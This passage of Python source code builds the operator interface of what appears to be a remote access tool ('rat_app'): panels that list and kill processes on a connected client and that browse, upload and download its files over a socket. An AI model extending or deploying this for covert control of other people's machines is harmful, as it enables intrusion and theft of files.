        details_text.insert(tk.END, f"\nCommand Line:\n{process_info.get('cmdline', 'Unknown')}\n")
        
        # Network connections if available
        if 'connections' in process_info and process_info['connections']:
            details_text.insert(tk.END, f"\nNetwork Connections:\n")
            for conn in process_info['connections']:
                details_text.insert(tk.END, f"- {conn}\n")
        
        # Open files if available
        if 'open_files' in process_info and process_info['open_files']:
            details_text.insert(tk.END, f"\nOpen Files:\n")
            for file in process_info['open_files']:
                details_text.insert(tk.END, f"- {file}\n")
        
        details_text.configure(state="disabled")  # Make read-only
        
        # Action buttons
        button_frame = ctk.CTkFrame(frame, fg_color="transparent")
        button_frame.pack(fill=tk.X, pady=10)
        
        refresh_btn = ctk.CTkButton(button_frame, text="Refresh", 
                                  command=lambda: self.refresh_process_details(details_text, process_info['pid']),
                                  fg_color=theme["button_color"],
                                  hover_color=theme["hover_color"])
        refresh_btn.pack(side=tk.LEFT, padx=5)
        
        kill_btn = ctk.CTkButton(button_frame, text="Terminate Process", 
                               command=lambda: [self.kill_process(), details_window.destroy()],
                               fg_color=theme["danger_color"],
                               hover_color=theme["hover_color"])
        kill_btn.pack(side=tk.LEFT, padx=5)
        
        close_btn = ctk.CTkButton(button_frame, text="Close", 
                                command=details_window.destroy,
                                fg_color=theme["button_color"],
                                hover_color=theme["hover_color"])
        close_btn.pack(side=tk.RIGHT, padx=5)
    
    def refresh_process_details(self, text_widget, pid):
        """Refresh the details for a specific process"""
        if not self.rat_app.current_client_socket:
            return
        
        try:
            # Send command to get specific process details
            command = f"PROCESS_DETAILS|{pid}"
            self.rat_app.current_client_socket.send(command.encode())
            
            # Get response size
            size_data = self.rat_app.current_client_socket.recv(8)
            response_size = struct.unpack('Q', size_data)[0]
            
            # Receive process details data
            data = b""
            buffer_size = self.rat_app.BUFFER
            
            while len(data) < response_size:
                chunk = self.rat_app.current_client_socket.recv(min(response_size - len(data), buffer_size))
                if not chunk:
                    break
                data += chunk
            
            process_info = json.loads(data.decode('utf-8'))
            
            # Check for error
            if isinstance(process_info, str) and process_info.startswith("ERROR:"):
                self.rat_app.log(process_info)
                return
            
            # Update text widget with new information
            text_widget.configure(state="normal")
            text_widget.delete(1.0, tk.END)
            
            # Add process details (same as in view_process_details)
            text_widget.insert(tk.END, f"Process ID: {process_info['pid']}\n")
            text_widget.insert(tk.END, f"Name: {process_info['name']}\n")
            text_widget.insert(tk.END, f"Executable: {process_info.get('exe', 'Unknown')}\n")
            text_widget.insert(tk.END, f"Status: {process_info.get('status', 'Unknown')}\n")
            text_widget.insert(tk.END, f"User: {process_info.get('username', 'Unknown')}\n")
            text_widget.insert(tk.END, f"CPU Usage: {process_info.get('cpu_percent', 0):.2f}%\n")
            
            # Format memory
            memory_mb = process_info.get('memory', 0) / (1024 * 1024)
            text_widget.insert(tk.END, f"Memory Usage: {memory_mb:.2f} MB\n")
            
            text_widget.insert(tk.END, f"Threads: {process_info.get('threads', 0)}\n")
            text_widget.insert(tk.END, f"Created: {process_info.get('create_time', 'Unknown')}\n")
            
            # Command line
            text_widget.insert(tk.END, f"\nCommand Line:\n{process_info.get('cmdline', 'Unknown')}\n")
            
            # Network connections if available
            if 'connections' in process_info and process_info['connections']:
                text_widget.insert(tk.END, f"\nNetwork Connections:\n")
                for conn in process_info['connections']:
                    text_widget.insert(tk.END, f"- {conn}\n")
            
            # Open files if available
            if 'open_files' in process_info and process_info['open_files']:
                text_widget.insert(tk.END, f"\nOpen Files:\n")
                for file in process_info['open_files']:
                    text_widget.insert(tk.END, f"- {file}\n")
            
            text_widget.configure(state="disabled")  # Make read-only
            
        except Exception as e:
            self.rat_app.log(f"Error refreshing process details: {e}")
    
    def sort_processes_by(self, column):
        """Sort the process list by the given column"""
        # Get all items
        item_list = [(self.process_tree.set(k, column), k) for k in self.process_tree.get_children('')]
        
        try:
            # Try to sort numerically for certain columns
            if column in ["PID", "CPU %", "Memory (MB)", "Threads"]:
                item_list.sort(key=lambda x: float(x[0].replace("%", "").strip()))
            else:
                # Sort alphabetically
                item_list.sort()
        except Exception:
            # Fall back to alphabetical sort
            item_list.sort()
        
        # Rearrange items in sorted positions
        for index, (val, k) in enumerate(item_list):
            self.process_tree.move(k, '', index)
    
    def show_context_menu(self, event):
        """Show the context menu on right-click"""
        if self.process_tree.selection():
            self.context_menu.post(event.x_root, event.y_root)
    
    def toggle_auto_refresh(self):
        """Toggle automatic refreshing of the process list"""
        self.auto_refresh = self.auto_refresh_var.get()
        
        if self.auto_refresh:
            self.stop_refresh = False
            
            if not self.refresh_thread or not self.refresh_thread.is_alive():
                self.refresh_thread = threading.Thread(target=self.auto_refresh_thread, daemon=True)
                self.refresh_thread.start()
                
            self.rat_app.log(f"Auto-refresh enabled (interval: {self.auto_refresh_interval}s)")
        else:
            self.stop_refresh = True
            self.rat_app.log("Auto-refresh disabled")
    
    def auto_refresh_thread(self):
        """Thread function for auto-refreshing process list"""
        while self.auto_refresh and not self.stop_refresh:
            # Only refresh if the tab is visible
            if self.rat_app.notebook.index(self.rat_app.notebook.select()) == self.rat_app.notebook.index(self.process_frame):
                self.process_frame.after(0, self.refresh_processes)
            
            # Wait for the refresh interval
            for _ in range(self.auto_refresh_interval * 2):  # Check every 0.5 seconds if we should stop
                if self.stop_refresh:
                    break
                time.sleep(0.5)
    
    def debug_json_data(self, data):
        """Helper method to debug JSON data parsing issues"""
        try:
            # Try to decode and pretty-print a small sample
            sample = data[:min(500, len(data))].decode('utf-8', errors='replace')
            self.rat_app.log(f"Sample data: {sample}")
            
            # Try to parse JSON
            parsed = json.loads(data.decode('utf-8'))
            self.rat_app.log("JSON parsed successfully")
            
            # Check structure
            if 'system' in parsed:
                self.rat_app.log("'system' key found")
            if 'processes' in parsed:
                self.rat_app.log(f"'processes' key found with {len(parsed['processes'])} items")
            
            return True
        except json.JSONDecodeError as e:
            self.rat_app.log(f"JSON decode error: {e}")
            # Try to identify where the error occurs
            error_pos = e.pos
            self.rat_app.log(f"Error at position {error_pos}")
            self.rat_app.log(f"Data around error: {data[max(0, error_pos-20):error_pos+20].decode('utf-8', errors='replace')}")
            return False
        except Exception as e:
            self.rat_app.log(f"Other error: {e}")
            return False
                

class FileTransferSystem:
    def __init__(self, parent, rat_app):
        self.parent = parent
        self.rat_app = rat_app
        self.current_transfer = None
        self.stop_transfer = False
        self.is_paused = False  # Initialize the is_paused attribute
        self.CHUNK_SIZE = 4096
        self.transfer_progress = 0
        self.transfer_states = {}
        self.show_hidden_files = False
        self.current_sort_column = "Name"
        self.sort_direction = "ascending"
        
        # Load saved transfer states
        self.load_transfer_states()
        
        # Create the UI
        self.setup_ui()
        
    def get_theme_colors(self):
        """Get the current theme colors from the rat_app."""
        theme_name = self.rat_app.current_theme
        if hasattr(self.rat_app, 'theme_manager') and self.rat_app.theme_manager is not None:
            return self.rat_app.THEMES[theme_name]
        else:
            return THEMES[theme_name]
            
    def register_with_theme_manager(self):
        """Register widgets with the theme manager if available."""
        if hasattr(self.rat_app, 'theme_manager') and self.rat_app.theme_manager is not None:
            tm = self.rat_app.theme_manager
            
            # Register all frame types
            for widget in [
                self.file_frame, self.client_card, self.status_card, 
                self.upload_frame, self.download_frame, self.source_card, 
                self.dest_card, self.info_card, self.queue_frame,
                self.history_frame, self.filter_frame, self.stats_frame
            ]:
                if widget:
                    tm.track_widget(widget)
            
            # Register buttons
            for button in [
                self.upload_btn, self.download_btn, self.cancel_btn, 
                self.resume_btn, self.pause_btn, self.clear_history_btn,
                self.refresh_btn, self.toggle_hidden_btn, self.create_folder_btn,
                self.queue_all_btn, self.dequeue_all_btn
            ]:
                if button:
                    tm.track_widget(button)
            
            # Register progress bar
            tm.track_widget(self.progress_bar)
            
            # Register labels
            tm.track_widget(self.client_info_label, "label")
            tm.track_widget(self.status_value, "label")
            tm.track_widget(self.speed_label, "label")
            tm.track_widget(self.eta_label, "label")
            
            # Register text widgets
            if hasattr(self, 'upload_info_text'):
                tm.track_widget(self.upload_info_text)
            
            # Register notebook
            tm.track_widget(self.transfer_notebook, "notebook")
            tm.track_widget(self.history_notebook, "notebook")
            
            # Register treeviews
            if hasattr(self, 'files_tree'):
                tm.track_widget(self.files_tree, "treeview")
            if hasattr(self, 'queue_tree'):
                tm.track_widget(self.queue_tree, "treeview")
            if hasattr(self, 'history_tree'):
                tm.track_widget(self.history_tree, "treeview")
        
    def setup_ui(self):
        # Get theme colors
        theme = self.get_theme_colors()

        self.file_frame = ctk.CTkFrame(self.parent)
        self.parent.add(self.file_frame, text="File Transfer")
        
        # Apply background color directly
        style = ttk.Style()
        style.configure("Custom.TNotebook", background=theme["bg_color"])
        style.map("Custom.TNotebook", background=[("selected", theme["bg_color"])])
        
        # Top section with client info and quick stats
        self.setup_client_info_section(theme)
        
        # Main content with tabs
        self.transfer_notebook = ttk.Notebook(self.file_frame, style="Custom.TNotebook")
        self.transfer_notebook.pack(fill=tk.BOTH, expand=True, padx=15, pady=10)
        
        # Create tabs with modern designs
        self.upload_frame = ctk.CTkFrame(self.transfer_notebook, fg_color=theme["bg_color"])
        self.transfer_notebook.add(self.upload_frame, text="Upload")
        self.setup_upload_tab()
        
        self.download_frame = ctk.CTkFrame(self.transfer_notebook, fg_color=theme["bg_color"])
        self.transfer_notebook.add(self.download_frame, text="Download")
        self.setup_download_tab()
        
        self.queue_frame = ctk.CTkFrame(self.transfer_notebook, fg_color=theme["bg_color"])
        self.transfer_notebook.add(self.queue_frame, text="Queue")
        self.setup_queue_tab()
        
        self.history_frame = ctk.CTkFrame(self.transfer_notebook, fg_color=theme["bg_color"])
        self.transfer_notebook.add(self.history_frame, text="History")
        self.setup_history_tab()
        
        # Bottom status section
        self.setup_status_section(theme)
        
        # Register widgets with theme manager
        self.register_with_theme_manager()
        
        # Bind events
        self.bind_events()
        
        # Update UI based on initial state
        self.update_ui_for_transfer(False)
    
    def setup_client_info_section(self, theme):
        """Create the top client info section with enhanced visual design."""
        self.client_card = ctk.CTkFrame(self.file_frame, fg_color=theme["card_color"],
                                 corner_radius=10)
        self.client_card.pack(fill=tk.X, padx=15, pady=15)
        
        # Create a grid layout for better organization
        client_header = ctk.CTkFrame(self.client_card, fg_color="transparent")
        client_header.pack(fill=tk.X, padx=15, pady=(10, 5))
        
        # Title with icon (using Unicode for now, can be replaced with actual icon)
        client_title = ctk.CTkLabel(client_header, text=" Client Connection", 
                                  font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                                  size=FONT_STYLES["subheading"][1], 
                                                  weight=FONT_STYLES["subheading"][2]))
        client_title.pack(side=tk.LEFT, anchor="w")
        
        # Right side - connection status indicator
        self.connection_status = ctk.CTkLabel(client_header, text="", text_color="#FF5555",
                                           font=ctk.CTkFont(size=18))
        self.connection_status.pack(side=tk.RIGHT, padx=5)
        
        # Main client info in a 2-column grid
        info_grid = ctk.CTkFrame(self.client_card, fg_color="transparent")
        info_grid.pack(fill=tk.X, pady=(0, 10), padx=15)
        
        # Left column - client details
        client_details = ctk.CTkFrame(info_grid, fg_color="transparent")
        client_details.pack(side=tk.LEFT, fill=tk.X, expand=True)
        
        client_label = ctk.CTkLabel(client_details, text="Connected Client:", 
                                  font=ctk.CTkFont(family=FONT_STYLES["normal"][0], 
                                                  size=FONT_STYLES["normal"][1], 
                                                  weight="bold"))
        client_label.pack(side=tk.LEFT, padx=5)
        
        self.client_info_label = ctk.CTkLabel(client_details, text="None",
                                           font=ctk.CTkFont(family=FONT_STYLES["normal"][0], 
                                                           size=FONT_STYLES["normal"][1]))
        self.client_info_label.pack(side=tk.LEFT, padx=5)
        
        # Right column - quick stats
        self.stats_frame = ctk.CTkFrame(info_grid, fg_color="transparent")
        self.stats_frame.pack(side=tk.RIGHT)
        
        self.total_transfers_label = ctk.CTkLabel(self.stats_frame, 
                                              text="Total Transfers: 0",
                                              font=ctk.CTkFont(family=FONT_STYLES["small"][0],
                                                             size=FONT_STYLES["small"][1]))
        self.total_transfers_label.pack(side=tk.RIGHT, padx=10)
    
    def setup_upload_tab(self):
        """Create an enhanced upload tab with better visual organization."""
        # Get theme colors
        theme = self.get_theme_colors()
        
        # Create a container with padding
        upload_container = ctk.CTkFrame(self.upload_frame, fg_color="transparent")
        upload_container.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Source file card with enhanced visuals
        self.source_card = ctk.CTkFrame(upload_container, fg_color=theme["card_color"],
                                 corner_radius=10)
        self.source_card.pack(fill=tk.X, padx=0, pady=10)
        
        # Header with icon
        source_header = ctk.CTkFrame(self.source_card, fg_color="transparent")
        source_header.pack(fill=tk.X, padx=15, pady=(10, 5))
        
        source_label = ctk.CTkLabel(source_header, text=" Source File", 
                                  font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                                  size=FONT_STYLES["subheading"][1], 
                                                  weight=FONT_STYLES["subheading"][2]))
        source_label.pack(side=tk.LEFT, anchor="w")
        
        # Multiple file upload option
        self.multiple_files_var = tk.BooleanVar(value=False)
        multiple_files_check = ctk.CTkCheckBox(source_header, text="Multiple Files",
                                            variable=self.multiple_files_var,
                                            command=self.toggle_multiple_files_mode,
                                            fg_color=theme["accent_color"])
        multiple_files_check.pack(side=tk.RIGHT, padx=5)
        
        # File selection with drag-drop support indicator
        file_select_frame = ctk.CTkFrame(self.source_card, fg_color="transparent")
        file_select_frame.pack(fill=tk.X, pady=(0, 10), padx=15)
        
        self.upload_file_entry = ctk.CTkEntry(file_select_frame, corner_radius=8,
                                           height=32,
                                           placeholder_text="Select file or drag & drop here",
                                           fg_color=theme["bg_color"],
                                           text_color=theme["fg_color"])
        self.upload_file_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        
        browse_btn = ctk.CTkButton(file_select_frame, text="Browse", 
                                 command=self.browse_upload_file, width=80,
                                 fg_color=theme["button_color"],
                                 hover_color=theme["hover_color"],
                                 corner_radius=8,
                                 height=32)
        browse_btn.pack(side=tk.RIGHT, padx=5)
        
        # Destination path card with better organization
        self.dest_card = ctk.CTkFrame(upload_container, fg_color=theme["card_color"],
                               corner_radius=10)
        self.dest_card.pack(fill=tk.X, padx=0, pady=10)
        
        # Header with icon
        dest_header = ctk.CTkFrame(self.dest_card, fg_color="transparent")
        dest_header.pack(fill=tk.X, padx=15, pady=(10, 5))
        
        dest_label = ctk.CTkLabel(dest_header, text=" Destination Path", 
                               font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                              size=FONT_STYLES["subheading"][1], 
                                              weight=FONT_STYLES["subheading"][2]))
        dest_label.pack(side=tk.LEFT, anchor="w")
        
        # Recent paths dropdown
        self.recent_paths_btn = ctk.CTkButton(dest_header, text="Recent Paths ", 
                                           command=self.show_recent_paths,
                                           width=100,
                                           fg_color=theme["button_color"],
                                           hover_color=theme["hover_color"],
                                           corner_radius=6,
                                           height=24)
        self.recent_paths_btn.pack(side=tk.RIGHT, padx=5)
        
        dest_frame = ctk.CTkFrame(self.dest_card, fg_color="transparent")
        dest_frame.pack(fill=tk.X, pady=(0, 10), padx=15)
        
        self.upload_dest_entry = ctk.CTkEntry(dest_frame, corner_radius=8, height=32,
                                          placeholder_text="Remote destination path",
                                          fg_color=theme["bg_color"],
                                          text_color=theme["fg_color"])
        self.upload_dest_entry.pack(fill=tk.X, pady=5, padx=5)
        self.upload_dest_entry.insert(0, "C:\\Temp\\")
        
        # Transfer options card
        options_card = ctk.CTkFrame(upload_container, fg_color=theme["card_color"],
                              corner_radius=10)
        options_card.pack(fill=tk.X, padx=0, pady=10)
        
        options_label = ctk.CTkLabel(options_card, text=" Transfer Options", 
                                   font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                                 size=FONT_STYLES["subheading"][1], 
                                                 weight=FONT_STYLES["subheading"][2]))
        options_label.pack(anchor="w", padx=15, pady=(10, 5))
        
        options_frame = ctk.CTkFrame(options_card, fg_color="transparent")
        options_frame.pack(fill=tk.X, pady=(0, 10), padx=15)
        
        # Add some useful upload options
        self.overwrite_var = tk.BooleanVar(value=True)
        overwrite_check = ctk.CTkCheckBox(options_frame, text="Overwrite existing files",
                                        variable=self.overwrite_var,
                                        fg_color=theme["accent_color"])
        overwrite_check.pack(side=tk.LEFT, padx=10)
        
        self.queue_var = tk.BooleanVar(value=False)
        queue_check = ctk.CTkCheckBox(options_frame, text="Add to queue",
                                    variable=self.queue_var,
                                    fg_color=theme["accent_color"])
        queue_check.pack(side=tk.LEFT, padx=10)
        
        # Upload button with enhanced visual appearance
        button_frame = ctk.CTkFrame(upload_container, fg_color="transparent")
        button_frame.pack(fill=tk.X, pady=15, padx=0)
        
        self.upload_btn = ctk.CTkButton(button_frame, text="Upload File", 
                                      command=self.upload_file,
                                      fg_color=theme["accent_color"],
                                      hover_color=theme["hover_color"],
                                      bg_color=theme["bg_color"],
                                      height=40,
                                      corner_radius=8,
                                      font=ctk.CTkFont(family=FONT_STYLES["normal"][0], 
                                                      size=FONT_STYLES["normal"][1],
                                                      weight="bold"))
        self.upload_btn.pack(side=tk.TOP, pady=5, padx=15)
        
        # File info card with better organization
        self.info_card = ctk.CTkFrame(upload_container, fg_color=theme["card_color"],
                               corner_radius=10)
        self.info_card.pack(fill=tk.BOTH, expand=True, padx=0, pady=10)
        
        info_header = ctk.CTkFrame(self.info_card, fg_color="transparent")
        info_header.pack(fill=tk.X, padx=15, pady=(10, 5))
        
        info_label = ctk.CTkLabel(info_header, text=" File Information", 
                               font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                              size=FONT_STYLES["subheading"][1], 
                                              weight=FONT_STYLES["subheading"][2]))
        info_label.pack(side=tk.LEFT, pady=(0, 5), anchor="w")
        
        # Clear button
        clear_btn = ctk.CTkButton(info_header, text="Clear", 
                               command=self.clear_file_info,
                               width=60, height=24,
                               fg_color=theme["button_color"],
                               hover_color=theme["hover_color"],
                               corner_radius=6)
        clear_btn.pack(side=tk.RIGHT, padx=5)
        
        self.upload_info_text = ctk.CTkTextbox(self.info_card, height=150, corner_radius=8,
                                            fg_color=theme["bg_color"],
                                            text_color=theme["fg_color"])
        self.upload_info_text.pack(fill=tk.BOTH, expand=True, padx=15, pady=(0, 15))
        self.upload_info_text.configure(state="disabled")
    
    def setup_download_tab(self):
        """Create an enhanced download tab with improved visual hierarchy and usability."""
        theme = self.get_theme_colors()
        
        # Configure treeview style
        self.configure_treeview_style(theme)
        
        # Container with padding
        download_container = ctk.CTkFrame(self.download_frame, fg_color="transparent")
        download_container.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Remote path section with filters and controls
        remote_frame = ctk.CTkFrame(download_container, fg_color=theme["card_color"],
                                  corner_radius=10)
        remote_frame.pack(fill=tk.X, padx=0, pady=10)
        
        # Header with icon and controls
        remote_header = ctk.CTkFrame(remote_frame, fg_color="transparent")
        remote_header.pack(fill=tk.X, padx=15, pady=(10, 5))
        
        remote_label = ctk.CTkLabel(remote_header, text=" Remote Location", 
                                  font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                                 size=FONT_STYLES["subheading"][1], 
                                                 weight=FONT_STYLES["subheading"][2]))
        remote_label.pack(side=tk.LEFT, anchor="w")
        
        # Create folder button
        self.create_folder_btn = ctk.CTkButton(remote_header, text="New Folder", 
                                          command=self.create_remote_folder,
                                          width=90, height=24,
                                          fg_color=theme["button_color"],
                                          hover_color=theme["hover_color"],
                                          corner_radius=6)
        self.create_folder_btn.pack(side=tk.RIGHT, padx=5)
        
        # Bookmark button
        bookmark_btn = ctk.CTkButton(remote_header, text="Bookmarks ", 
                                   command=self.show_bookmarks,
                                   width=90, height=24,
                                   fg_color=theme["button_color"],
                                   hover_color=theme["hover_color"],
                                   corner_radius=6)
        bookmark_btn.pack(side=tk.RIGHT, padx=5)
        
        # Path and navigation controls
        path_frame = ctk.CTkFrame(remote_frame, fg_color="transparent")
        path_frame.pack(fill=tk.X, pady=5, padx=15)
        
        # Back button
        back_btn = ctk.CTkButton(path_frame, text="", 
                              command=self.navigate_back,
                              width=30, height=32,
                              fg_color=theme["button_color"],
                              hover_color=theme["hover_color"],
                              corner_radius=8)
        back_btn.pack(side=tk.LEFT, padx=(0, 5))
        
        self.remote_path_entry = ctk.CTkEntry(path_frame, 
                                           corner_radius=8, height=32,
                                           fg_color=theme["bg_color"],
                                           text_color=theme["fg_color"])
        self.remote_path_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        
        # Go/Refresh button
        self.refresh_btn = ctk.CTkButton(path_frame, text="", 
                                     command=self.list_remote_files,
                                     width=30, height=32,
                                     fg_color=theme["button_color"],
                                     hover_color=theme["hover_color"],
                                     corner_radius=8)
        self.refresh_btn.pack(side=tk.RIGHT, padx=5)
        
        # Filter section
        self.filter_frame = ctk.CTkFrame(remote_frame, fg_color="transparent")
        self.filter_frame.pack(fill=tk.X, pady=5, padx=15)
        
        filter_label = ctk.CTkLabel(self.filter_frame, text="Filter:", 
                                  font=ctk.CTkFont(weight="bold"))
        filter_label.pack(side=tk.LEFT, padx=5)
        
        self.filter_entry = ctk.CTkEntry(self.filter_frame, 
                                      corner_radius=8, height=28,
                                      width=150,
                                      fg_color=theme["bg_color"],
                                      text_color=theme["fg_color"])
        self.filter_entry.pack(side=tk.LEFT, padx=5)
        
        # Show hidden files toggle
        self.toggle_hidden_btn = ctk.CTkButton(self.filter_frame, text="Show Hidden", 
                                           command=self.toggle_hidden_files,
                                           width=90, height=28,
                                           fg_color=theme["button_color"] if not self.show_hidden_files else theme["accent_color"],
                                           hover_color=theme["hover_color"],
                                           corner_radius=6)
        self.toggle_hidden_btn.pack(side=tk.RIGHT, padx=5)
        
        # Remote file browser with enhanced styling
        browser_frame = ctk.CTkFrame(download_container, fg_color=theme["card_color"],
                                   corner_radius=10)
        browser_frame.pack(fill=tk.BOTH, expand=True, padx=0, pady=10)
        
        browser_header = ctk.CTkFrame(browser_frame, fg_color="transparent")
        browser_header.pack(fill=tk.X, padx=15, pady=(10, 5))
        
        browser_label = ctk.CTkLabel(browser_header, text=" Remote Files", 
                                   font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                                  size=FONT_STYLES["subheading"][1], 
                                                  weight=FONT_STYLES["subheading"][2]))
        browser_label.pack(side=tk.LEFT, pady=5, anchor="w")
        
        # File count indicator
        self.file_count_label = ctk.CTkLabel(browser_header, text="0 items",
                                         font=ctk.CTkFont(size=FONT_STYLES["small"][1]))
        self.file_count_label.pack(side=tk.RIGHT, padx=5)
        
        # Create treeview for remote files with better styling
        tree_frame = ctk.CTkFrame(browser_frame, fg_color="transparent")
        tree_frame.pack(fill=tk.BOTH, expand=True, padx=15, pady=5)
        
        columns = ("Name", "Size", "Type", "Modified")
        self.files_tree = ttk.Treeview(tree_frame, columns=columns, show="headings", style="Custom.Treeview")
        
        # Define headings with click-to-sort capability
        for col in columns:
            self.files_tree.heading(col, text=col, command=lambda c=col: self.sort_treeview(self.files_tree, c))
            self.files_tree.column(col, width=100)
        
        # Adjust column width proportions
        self.files_tree.column("Name", width=250)
        self.files_tree.column("Size", width=100)
        self.files_tree.column("Type", width=100)
        self.files_tree.column("Modified", width=150)
        
        # Add scrollbars
        y_scrollbar = ttk.Scrollbar(tree_frame, orient=tk.VERTICAL, command=self.files_tree.yview)
        self.files_tree.configure(yscroll=y_scrollbar.set)
        
        x_scrollbar = ttk.Scrollbar(tree_frame, orient=tk.HORIZONTAL, command=self.files_tree.xview)
        self.files_tree.configure(xscroll=x_scrollbar.set)
        
        # Pack components
        y_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.files_tree.pack(side=tk.TOP, fill=tk.BOTH, expand=True)
        x_scrollbar.pack(side=tk.BOTTOM, fill=tk.X)
        
        # Add context menu
        self.create_treeview_context_menu(self.files_tree)
        
        # Bind events
        self.files_tree.bind("<Double-1>", self.select_remote_file)
        self.files_tree.bind("<Button-3>", self.show_context_menu)
        
        # Local destination
        dest_frame = ctk.CTkFrame(download_container, fg_color=theme["card_color"],
                                corner_radius=10)
        dest_frame.pack(fill=tk.X, padx=0, pady=10)
        
        dest_header = ctk.CTkFrame(dest_frame, fg_color="transparent")
        dest_header.pack(fill=tk.X, padx=15, pady=(10, 5))
        
        dest_label = ctk.CTkLabel(dest_header, text=" Local Destination", 
                                font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                               size=FONT_STYLES["subheading"][1], 
                                               weight=FONT_STYLES["subheading"][2]))
        dest_label.pack(side=tk.LEFT, anchor="w")
        
        dest_select_frame = ctk.CTkFrame(dest_frame, fg_color="transparent")
        dest_select_frame.pack(fill=tk.X, pady=5, padx=15)
        
        self.download_dest_entry = ctk.CTkEntry(dest_select_frame,
                                             corner_radius=8, height=32,
                                             fg_color=theme["bg_color"],
                                             text_color=theme["fg_color"])
        self.download_dest_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        
        browse_dest_btn = ctk.CTkButton(dest_select_frame, text="Browse", 
                                      command=self.browse_download_dest, width=80,
                                      fg_color=theme["button_color"],
                                      hover_color=theme["hover_color"],
                                      corner_radius=8, height=32)
        browse_dest_btn.pack(side=tk.RIGHT, padx=5)
        
        # Action buttons
        actions_frame = ctk.CTkFrame(download_container, fg_color="transparent")
        actions_frame.pack(fill=tk.X, pady=10, padx=0)
        
        # Download button
        self.download_btn = ctk.CTkButton(actions_frame, text="Download Selected", 
                                        command=self.download_file,
                                        bg_color=theme["bg_color"],
                                        fg_color=theme["accent_color"],
                                        hover_color=theme["hover_color"],
                                        height=40,
                                        corner_radius=8,
                                        font=ctk.CTkFont(weight="bold"))
        self.download_btn.pack(side=tk.LEFT, padx=5, expand=True, fill=tk.X)
        
        # Queue button
        queue_btn = ctk.CTkButton(actions_frame, text="Add to Queue", 
                               command=self.add_to_queue,
                               bg_color=theme["bg_color"],
                               fg_color=theme["button_color"],
                               hover_color=theme["hover_color"],
                               height=40,
                               corner_radius=8)
        queue_btn.pack(side=tk.LEFT, padx=5, expand=True, fill=tk.X)
        
        # Selection count indicator
        self.selection_count = ctk.CTkLabel(actions_frame, text="No files selected",
                                        fg_color=theme["bg_color"])
        self.selection_count.pack(side=tk.RIGHT, padx=10)
    
    def setup_queue_tab(self):
        """Create a new queue management tab."""
        theme = self.get_theme_colors()
        
        # Configure queue treeview style
        style = ttk.Style()
        style.configure("Queue.Treeview", 
                        background=theme["bg_color"],
                        foreground=theme["fg_color"],
                        fieldbackground=theme["card_color"],
                        borderwidth=0,
                        highlightthickness=0)
        
        style.map("Queue.Treeview",
                background=[("selected", theme["accent_color"])],
                foreground=[("selected", "#FFFFFF")])
                        
        # Container with padding
        queue_container = ctk.CTkFrame(self.queue_frame, fg_color="transparent")
        queue_container.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Queue header with controls
        queue_header = ctk.CTkFrame(queue_container, fg_color=theme["card_color"],
                                 corner_radius=10)
        queue_header.pack(fill=tk.X, padx=0, pady=10)
        
        header_title = ctk.CTkFrame(queue_header, fg_color="transparent")
        header_title.pack(fill=tk.X, padx=15, pady=(10, 5))
        
        title_label = ctk.CTkLabel(header_title, text=" Transfer Queue", 
                                font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                               size=FONT_STYLES["subheading"][1], 
                                               weight=FONT_STYLES["subheading"][2]))
        title_label.pack(side=tk.LEFT, anchor="w")
        
        self.queue_count = ctk.CTkLabel(header_title, text="0 items",
                                    font=ctk.CTkFont(size=FONT_STYLES["small"][1]))
        self.queue_count.pack(side=tk.RIGHT, padx=5)
        
        # Queue controls
        controls_frame = ctk.CTkFrame(queue_header, fg_color="transparent")
        controls_frame.pack(fill=tk.X, padx=15, pady=(0, 10))
        
        self.queue_all_btn = ctk.CTkButton(controls_frame, text="Process All", 
                                       command=self.process_all_queue,
                                       fg_color=theme["accent_color"],
                                       hover_color=theme["hover_color"],
                                       width=100, height=30,
                                       corner_radius=6)
        self.queue_all_btn.pack(side=tk.LEFT, padx=5)
        
        self.dequeue_all_btn = ctk.CTkButton(controls_frame, text="Clear Queue", 
                                        command=self.clear_queue,
                                        fg_color=theme["button_color"],
                                        hover_color=theme["hover_color"],
                                        width=100, height=30,
                                        corner_radius=6)
        self.dequeue_all_btn.pack(side=tk.LEFT, padx=5)
        
        # Priority selector
        priority_frame = ctk.CTkFrame(controls_frame, fg_color="transparent")
        priority_frame.pack(side=tk.RIGHT, padx=5)
        
        priority_label = ctk.CTkLabel(priority_frame, text="Default Priority:")
        priority_label.pack(side=tk.LEFT, padx=5)
        
        self.priority_var = tk.StringVar(value="Normal")
        priority_menu = ctk.CTkOptionMenu(priority_frame, values=["Low", "Normal", "High"],
                                       variable=self.priority_var,
                                       width=100, height=30,
                                       fg_color=theme["button_color"],
                                       button_color=theme["hover_color"])
        priority_menu.pack(side=tk.LEFT, padx=5)
        
        # Queue list with enhanced styling
        queue_list_frame = ctk.CTkFrame(queue_container, fg_color=theme["card_color"],
                                      corner_radius=10)
        queue_list_frame.pack(fill=tk.BOTH, expand=True, padx=0, pady=10)
        
        # Create treeview for queue
        tree_frame = ctk.CTkFrame(queue_list_frame, fg_color="transparent")
        tree_frame.pack(fill=tk.BOTH, expand=True, padx=15, pady=15)
        
        columns = ("ID", "Type", "Source", "Destination", "Size", "Priority", "Status")
        self.queue_tree = ttk.Treeview(tree_frame, columns=columns, show="headings", style="Custom.Treeview")
        
        # Define headings with click-to-sort capability
        for col in columns:
            self.queue_tree.heading(col, text=col, command=lambda c=col: self.sort_treeview(self.queue_tree, c))
            
        # Adjust column widths
        self.queue_tree.column("ID", width=50)
        self.queue_tree.column("Type", width=80)
        self.queue_tree.column("Source", width=200)
        self.queue_tree.column("Destination", width=200)
        self.queue_tree.column("Size", width=80)
        self.queue_tree.column("Priority", width=80)
        self.queue_tree.column("Status", width=100)
        
